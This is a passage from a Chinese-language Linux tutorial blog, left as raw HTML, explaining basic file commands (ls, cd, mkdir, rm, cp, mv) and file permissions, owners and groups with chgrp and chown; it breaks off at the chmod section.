命令算是比较常用的命令</p><p>使用者权限：所有使用者都可使用。</p><p><strong>语法如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> [选项]  目录名称<br></code></pre></td></tr></table></figure><p><strong>选项与参数：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>-a ：全部的文件，连同隐藏档( 开头为 . 的文件) 一起列出来(常用)</p></li><li class="lvl-2"><p>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</p></li><li class="lvl-2"><p>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</p></li></ul><p><strong>将根目录下的所有文件列出来(含属性与隐藏档)</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span> ~<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576553470716.png" alt="1576553470716"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576639252612.png" alt="1576639252612"></p><p><code>ls -l</code> 可以查看文件夹下文件的详细信息, 从左到右 依次是:</p><ul class="lvl-0"><li class="lvl-2"><p><strong>权限（A区域）</strong>, 第一个字符如果是 <code>d</code> 表示目录</p></li><li class="lvl-2"><p><strong>硬链接数（B区域）</strong>, 通俗的讲就是有多少种方式, 可以访问当前目录和文件</p></li><li class="lvl-2"><p><strong>属主（C区域）</strong>, 文件是所有者、或是叫做属主</p></li><li class="lvl-2"><p><strong>属组（D区域）</strong>, 文件属于哪个组</p></li><li class="lvl-2"><p><strong>大小（E区域）：文件大小</strong></p></li><li class="lvl-2"><p><strong>时间（F区域）：最后一次访问时间</strong></p></li><li class="lvl-2"><p><strong>名称（G区域）:文件的名称</strong></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576553646036.png" alt="1576553646036"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">总结<br>以上三种是经常被使用到的命令<br>它们之间的区别是<br><span class="hljs-keyword">ls</span>  显示不隐藏的文件与文件夹<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> 显示不隐藏的文件与文件夹的详细信息<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span>   显示所有文件与文件夹的详细信息<br></code></pre></td></tr></table></figure><h4 id="2-pwd显示当前目录">2) pwd显示当前目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行<span class="hljs-built_in">pwd</span>命令相当于我们在Windows系统路径导航栏中查看到的当前浏览位置信息<br></code></pre></td></tr></table></figure><p>如下图</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576564294612.png" alt="1576564294612"></p><p>pwd 是 <strong>Print Working Directory</strong> 的缩写，也就是显示目前所在当前目录的命令。</p><p>使用者权限：所有使用者都可使用。</p><p><strong>查看当前所在目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span> -P<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576552719245.png" alt="1576552719245"></p><h4 id="3-cd-切换目录">3) cd (切换目录)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux的<span class="hljs-built_in">cd</span>切换目录，相当于我们在Windows中通过鼠标或者快捷键点开不同的目录<br></code></pre></td></tr></table></figure><p>注意：在Linux系统当中， cd 命令算是比较常用的命令</p><p>cd是Change Directory的缩写，这是用来变换工作目录的命令</p><p>使用者权限：所有使用者都可使用。</p><p><strong>语法如下：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span><span class="hljs-meta"> [相对路径或绝对路径]</span><br></code></pre></td></tr></table></figure><p>在正式学习cd命令前面，我们通过下面一个座位图的形式讲解下相对路径和绝对路径是怎么表现的。</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576465885337.png" alt="1576465885337"></p><ul class="lvl-0"><li class="lvl-2"><p><strong>绝对路径：</strong><br>路径的写法，由根目录 / 写起，例如： /usr/share/doc 这个目录。</p></li><li class="lvl-2"><p><strong>相对路径：</strong><br>路径的写法，不是由 / 写起，例如由 /usr/share/doc 要到 /usr/share/man 底下时，可以写成： cd …/man 这就是相对路径的写法啦！</p></li></ul><p><strong>1、使用相对路径定位目标</strong></p><ul class="lvl-0"><li class="lvl-2"><p>特征:  <strong>相对路径</strong> 输入路径时, 最前面不是以 “/” 开始的, 表示相对 <strong>当前目录</strong> 所在的位置</p></li><li class="lvl-2"><p>缺点:  参照工作目录 发生变化 相对路径也要发生变化</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">需求<span class="hljs-number">1</span>: 当前工作目录是 <span class="hljs-regexp">/usr, 使用相对路径 切换到 /u</span>sr/tmp 目录下 <br><br>需求<span class="hljs-number">2</span>: 当前工作目录是 <span class="hljs-regexp">/root, 使用相对路径 切换到 /u</span>sr/tmp 目录下 <br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576466126779.png" alt="1576466126779"></p><p>执行效果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">注意：<br><span class="hljs-built_in">cd</span> ~ 表示回到根目录<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576466284360.png" alt="1576466284360"></p><p><strong>2、使用绝对路径定位目标</strong></p><ul class="lvl-0"><li class="lvl-2"><p>特征: <strong>绝对路径</strong> 在输入路径时, 最前面是以 <code>/</code>  开始的, 表示 从 <strong>根目录</strong> 开始的具体目录位置</p></li><li class="lvl-2"><p>优点: 定位准确, 不会因为 工作目录变化 而变化</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">需求<span class="hljs-number">1</span>: 当前工作目录是 <span class="hljs-regexp">/usr, 使用绝对路径 切换到 /u</span>sr/tmp 目录下 <br><br>需求<span class="hljs-number">2</span>: 当前工作目录是 <span class="hljs-regexp">/root, 使用绝对路径 切换到 /u</span>sr/tmp 目录下 <br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576466413099.png" alt="1576466413099"></p><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576466506750.png" alt="1576466506750"></p><blockquote><p>总结</p><ul class="lvl-1"><li class="lvl-2"><strong>相对路径</strong> 在输入路径时, 最前面不是以 <code>/</code> 开始的 , 表示相对 <strong>当前目录</strong> 所在的目录位置</li><li class="lvl-2"><strong>绝对路径</strong> 在输入路径时, 最前面是以 <code>/</code>  开始的, 表示 从 <strong>根目录</strong> 开始的具体目录位置</li></ul></blockquote><h4 id="4-mkdir-创建目录">4) mkdir(创建目录)</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">引子：<br>Linux的mkdir命令相当于我们在Windows中通过鼠标或者快捷键新建文件夹<br></code></pre></td></tr></table></figure><p>mkdir命令用于建立名称为 dirName 之子目录</p><p>使用权限：于目前目录有适当权限的所有使用者</p><p><strong>语法</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir [-p] dirName<br></code></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>-p 确保目录名称存在，不存在的就建一个</p></li></ul><p>建立一个名为jinyanlong 的子目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir jinyanlong<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576553229832.png" alt="1576553229832"></p><p>查看新建的 文件</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576553205885.png" alt="1576553205885"></p><p>在工作目录下的 aaa目录中，建立一个名为 bbb的子目录。 若 aaa目录原本不存在，则建立一个。（注：本例若不加 -p，且原本 aaa目录不存在，则产生错误。）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p aaa/bbb<br></code></pre></td></tr></table></figure><p>执行效果如下</p><blockquote><p>这里为了显示更直观，我们使用了tree命令</p><p>后面在讲解到yum的时候，会详细讲解</p><p>此处先使用</p></blockquote><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576560522053.png" alt="1576560522053"></p><p>由上图我们发现，aaa目录被强制创建，里面包含了bbb文件。</p><h4 id="5-rmdir-删空目录"><strong>5) rmdir(删空目录)</strong></h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Linux的rmdir命令相当于我们在Windows中通过鼠标或者快捷键删除文件夹。<br>稍微有点不同的就是在Linux中删除子目录的时候，如果主目录下没有了目录以及文件，会连同主目录同时删除了（需要写Linux带有P的参数）<br></code></pre></td></tr></table></figure><p>rmdir命令删除空的目录</p><p>使用权限：于目前目录有适当权限的所有使用者。</p><p><strong>语法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rmdir [-p] dirName<br></code></pre></td></tr></table></figure><p><strong>参数</strong>：</p><ul class="lvl-0"><li class="lvl-2"><p>-p 是当子目录被删除后使它也成为空目录的话，则顺便一并删除。</p></li></ul><p><strong>将工作目录下，名为 jinyanlong 的子目录删除 :</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rmdir jinyanlong<br></code></pre></td></tr></table></figure><p><strong>在工作目录下的 aaa目录中，删除名为 bbb的子目录。若 bbb删除后，aaa目录成为空目录，则 aaa同时也会被删除</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rmdir  -p aaa/bbb<br></code></pre></td></tr></table></figure><blockquote><p>总结：</p><p>rmdir  -p aaa/bbb也就是说</p><p>在删除bbb目录完成后，发现aaa目录也是空目录了，在删除完bbb后aaa也同时被删除了。</p></blockquote><h4 id="6-cp-文件复制">6) cp(文件复制)</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Linux</span>的<span class="hljs-meta">cp</span>命令相当于我们在Windows中通过鼠标或者快捷键复制文件或者目录<br></code></pre></td></tr></table></figure><p>cp命令主要用于复制文件或目录。</p><p>使用权限：于目前目录有适当权限的所有使用者</p><p><strong>语法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp [options] source dest<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp [options] source... directory<br></code></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>-a：此选项通常在复制目录时使用，它保留链接、文件属性，并复制目录下的所有内容。其作用等于dpR参数组合。</p></li><li class="lvl-2"><p>-d：复制时保留链接。这里所说的链接相当于Windows系统中的快捷方式。</p></li><li class="lvl-2"><p>-f：覆盖已经存在的目标文件而不给出提示。</p></li><li class="lvl-2"><p>-i：与-f选项相反，在覆盖目标文件之前给出提示，要求用户确认是否覆盖，回答&quot;y&quot;时目标文件将被覆盖。</p></li><li class="lvl-2"><p>-p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。</p></li><li class="lvl-2"><p>-r/R：若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。</p></li><li class="lvl-2"><p>-l：不复制文件，只是生成链接文件。</p></li></ul><p>我们将当前目录&quot;aaa/&quot;下的所有目录以及文件复制到新目录&quot;ccc&quot;下，输入如下命令：</p><p><strong>1、数据准备</strong></p><p>创建aaa目录并且aaa下包含bbb目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p aaa/bbb<br>mkdir -p ccc<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576561579056.png" alt="1576561579056"></p><p>aaa目录下有bbb</p><p>ccc下面没有目录和文件</p><p><strong>2、执行复制</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp –r aaa/*  ccc  <br></code></pre></td></tr></table></figure><p>执行效果如下</p><p>我们将aaa下面的所有文件、目录复制到了目录c下面</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576562978352.png" alt="1576562978352"></p><blockquote><p>总结：</p><p>用户使用该指令复制目录时，必须使用参数&quot;-r&quot;或者&quot;-R&quot;。</p><p>如果不加参数&quot;-r&quot;或者&quot;-R&quot;,只复制文件，而略过目录</p></blockquote><h4 id="7-rm-删除目录">7) rm(删除目录)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux的<span class="hljs-built_in">rm</span>命令相当于我们在Windows中通过鼠标或者快捷键删除文件或者目录<br></code></pre></td></tr></table></figure><p>rm命令用于删除一个文件或者目录。</p><p>使用权限：于目前目录有适当权限的所有使用者</p><p><strong>语法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm [options] name...<br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>-i 删除前逐一询问确认。</p></li><li class="lvl-2"><p>-f 即使原档案属性设为唯读，亦直接删除，无需逐一确认。</p></li><li class="lvl-2"><p>-r 将目录及以下之档案亦逐一删除。</p></li></ul><p>如果我们要删除文件可以直接使用rm命令，若删除目录则必须配合选项&quot;-r&quot;，例如：</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576563524635.png" alt="1576563524635"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm -r  ccc<br></code></pre></td></tr></table></figure><p>执行删除，如下图</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576563827977.png" alt="1576563827977"></p><blockquote><p>注意</p><p>文件一旦通过rm命令删除，则无法恢复，所以必须格外小心地使用该命令</p><p>如果删除文件（<a href="http://xn--bvs393b.sh">比如.sh</a> 、.txt）</p><p>直接使用rm  name.txt</p></blockquote><h4 id="8-mv-移动文件">8) mv(移动文件)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux的<span class="hljs-built_in">mv</span>命令相当于我们在Windows中通过鼠标或者快捷键剪切（+重命名）+粘贴文件或者目录<br></code></pre></td></tr></table></figure><p>mv 命令用来为文件或目录改名、或将文件或目录移入其它位置</p><p><strong>语法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv [options] source dest<br>mv [options] source... directory<br></code></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>-i: 若指定目录已有同名文件，则先询问是否覆盖旧文件;</p></li><li class="lvl-2"><p>-f: 在 mv 操作要覆盖某已有的目标文件时不给任何指示;</p></li></ul><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576565378463.png" alt="1576565378463"></p><p>将文件 aaa 更名为 bbb :</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576565459075.png" alt="1576565459075"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">1、创建aaa目录、<br>mkdir  aaa<br>2、开始重命名<br>mv aaa bbb<br></code></pre></td></tr></table></figure><p>执行后</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576565489569.png" alt="1576565489569"></p><p>将ccc目录放入ddd目录中。</p><p>注意，如果ddd目录不存在，则该命令将ccc改名为ddd。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">创建ccc<br>mkdir ccc<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576565710078.png" alt="1576565710078"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">开始移动<br>mv ccc/ ddd <br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576565800010.png" alt="1576565800010"></p><p>由上图我们发现，由于ddd目录不存在，所以在mv的时候将ccc目录改名为了ddd。</p><h2 id="3-2-Linux-文件基本属性">3.2 Linux 文件基本属性</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在Wndows系统中，我们可以选中一个文件，右键属性，可以查看到这个文件的文件类型（基本信息），以及文件的权限信息，在Linux中，它是通过不同字符的排序顺序来表示文件的类型以及权限所属信息的。<br></code></pre></td></tr></table></figure><p>Linux系统是一种典型的多用户系统，不同的用户处于不同的地位，拥有不同的权限。为了保护系统的安全性，Linux系统对不同的用户访问同一文件（包括目录文件）的权限做了不同的规定。</p><p>下面我们就一起学习下Linux系统不同权限的文件和目录在怎么表示的</p><p>在Linux中我们可以使用ll或者ls –l命令来显示一个文件的属性以及文件所属的用户和组，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -l<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576032746450.png" alt="1576032746450"></p><p>实例中，bin文件的第一个属性用&quot;d&quot;表示。&quot;d&quot;在Linux中代表该文件是一个目录文件。</p><p>在Linux中第一个字符代表这个文件是目录、文件或链接文件等等。</p><ul class="lvl-0"><li class="lvl-2"><p>当为[ <strong>d</strong> ]则是目录</p></li><li class="lvl-2"><p>当为[ <strong>-</strong> ]则是文件；</p></li><li class="lvl-2"><p>若是[ <strong>l</strong> ]则表示为链接文档(link file)；</p></li><li class="lvl-2"><p>若是[ <strong>b</strong> ]则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；</p></li><li class="lvl-2"><p>若是[ <strong>c</strong> ]则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置)。</p></li></ul><p>接下来的字符中，以三个为一组，且均为『rwx』 的三个参数的组合。其中，[ r ]代表可读(read)、[ w ]代表可写(write)、[ x ]代表可执行(execute)。 要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号[ - ]而已。</p><p>每个文件的属性由左边第一部分的10个字符来确定（如下图）。</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576460571985.png" alt="1576460571985"></p><p>从左至右用0-9这些数字来表示。</p><p>第0位确定文件类型，第1-3位确定属主（该文件的所有者）拥有该文件的权限。</p><p>第4-6位确定属组（所有者的同组用户）拥有该文件的权限，第7-9位确定其他用户拥有该文件的权限。</p><p>其中，第1、4、7位表示读权限，如果用&quot;r&quot;字符表示，则有读权限，如果用&quot;-&quot;字符表示，则没有读权限；</p><p>第2、5、8位表示写权限，如果用&quot;w&quot;字符表示，则有写权限，如果用&quot;-“字符表示没有写权限；第3、6、9位表示可执行权限，如果用&quot;x&quot;字符表示，则有执行权限，如果用”-&quot;字符表示，则没有执行权限。</p><h2 id="3-3-Linux文件属主和属组">3.3 Linux文件属主和属组</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">引子：<br>对于一个文件来说，它都有一个特定的所有者，也就是对该文件具有所有权的用户。<br>也就是所谓的属主，它属于哪个用户的意思。<br>除了属主，还有属组，也就是说，这个文件是属于哪个组的（用户所属的组）。<br>文件的【属主】有一套【读写执行权限rwx】<br>文件的【属组】有一套【读写执行权限rwx】<br>还有它权限，下面我们在介绍<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576402570345.png" alt="1576402570345"></p><p>在以上实例中，aaa文件是一个目录文件，属主和属组都为 itcast，属主有可读、可写、可执行的权限（rwx）；与属主同组的其他用户有可读可写和可执行的权限（rwx）；其他用户也有可读和可执行的权限（r-x）。</p><h3 id="3-3-1-chgrp更改属组"><strong>3.3.1 chgrp更改属组</strong></h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">实际开发中我们经常会创建新建目录和文件，一般情况下，通过命令进行新建，<br>在创建完成后，使用不同的用户访问，可能就会出现报错，无法访问等等问题。<br>然后经过一番这查找,发现该有的文件都在，大小写也没问题，路径也没问题<br>其实并不是这些问题。而是权限问题导致我们无法访问！是因为一个文件默认隶属于一个属组，而使用其他用户访问这个文件肯定无法访问<span class="hljs-comment">(因为访问用户所属的组和文件所在的不是同一个组)</span><br>那么怎么可以正常访问呢？其实就是通过更改用户组（用户组、文件组）来解决这些问题<br></code></pre></td></tr></table></figure><p>chgrp命令用于变更文件或目录的所属群组。</p><p>文件或目录权限的的拥有者由所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可</p><p>为了方便初学者记忆，可以将 chgrp 理解为是 “change group” 的缩写</p><p><strong>语法如下</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chgrp <span class="hljs-selector-attr">[-cfhRv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[所属群组]</span><span class="hljs-selector-attr">[文件或目录...]</span> 或 chgrp <span class="hljs-selector-attr">[-cfhRv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--reference=&lt;参考文件或目录&gt;]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[文件或目录...]</span><br></code></pre></td></tr></table></figure><p><strong>改变文件的群组属性</strong></p><p>我们通过root用户进入（如下图），上接上面的例子</p><p>我们的aaa文件的属主和属组都属于itcast（如下图）</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576407437975.png" alt="1576407437975"></p><p>我们现在通过chgrp命令将文件aaa的属组更改成root（其他也可以）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chgrp -v root aaa<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576407536566.png" alt="1576407536566"></p><p>我们通过下面的命令查询文件aaa的属组是否发生了变化，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576407585301.png" alt="1576407585301"></p><p>由上图我们发现，文件aaa的属组由itcast变成了root</p><p>这样的话，文件的属组就发生了变化。</p><h3 id="3-3-2-chown更改属主和属组">3.3.2 chown更改属主和属组**</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">我们为了让一些用户有权限查看某一文档，比如是一个时间表，而编写时间表的人要具有读写执行的权限<span class="hljs-comment">(属主)</span><br>我们想让一些用户知道这个时间表的内容，而不让他们修改，所以我们可以把这些用户都划到一个组（属组），然后来修改这个文件的权限，让用户组可读，这样用户组下面的每个用户都是可读的<br></code></pre></td></tr></table></figure><p>Linux是多任务操作系统，所有的档案皆有拥有者。利用 chown 可以将档案的拥有者加以改变。一般来说，这个指令只有是由系统管理者(root)所使用，一般使用者没有权限可以改变别人的档案拥有者，也没有权限可以自己的档案拥有者改设为别人。只有系统管理者(root)才有这样的权限</p><p>使用权限 : 管理员账户</p><p><strong>语法如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> [–R] 属主名 文件名<br><span class="hljs-built_in">chown</span> [-R] 属主名：属组名 文件名<br></code></pre></td></tr></table></figure><p>我们通过root用户进入（如下图），上接上面的例子</p><p>我们的aaa文件的属主属于itcast、属组属于root</p><p>我们现在通过chgrp命令将文件aaa的属主更改成root，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span>  root aaa<br></code></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576407880885.png" alt="1576407880885"></p><p>我们通过下面的命令查询文件aaa的属主是否发生了变化，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576407928200.png" alt="1576407928200"></p><p>由上图我们发现，文件aaa的属主和属组都变成了root。</p><p><strong>我们将aaa文件的拥有者与群组改回为itcast：</strong></p><p>注意：chown命令可以更改属主和属组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> itcast:itcast aaa<br></code></pre></td></tr></table></figure><p>我们通过下面的命令查询文件aaa的属主是否发生了变化，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l<br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/1576408146911.png" alt="1576408146911"></p><p>由上图可知，aaa文件的属主和属组都被更改回来了。</p><h3 id="3-3-3-chmod权限命令">3.3.3 chmod权限命令</h3><p>Linux文件属性有两种设置方法，一种是数字，一种是符号</p><p>Linux的文件调用权限分为三级 : 文件属主、属组、其他。利用 chmod 可以控制文件如何被他人所调用。</p><p><strong>使用权限 : 所有使用者</strong></p><p><strong>语法</strong></p><figure class="highlight 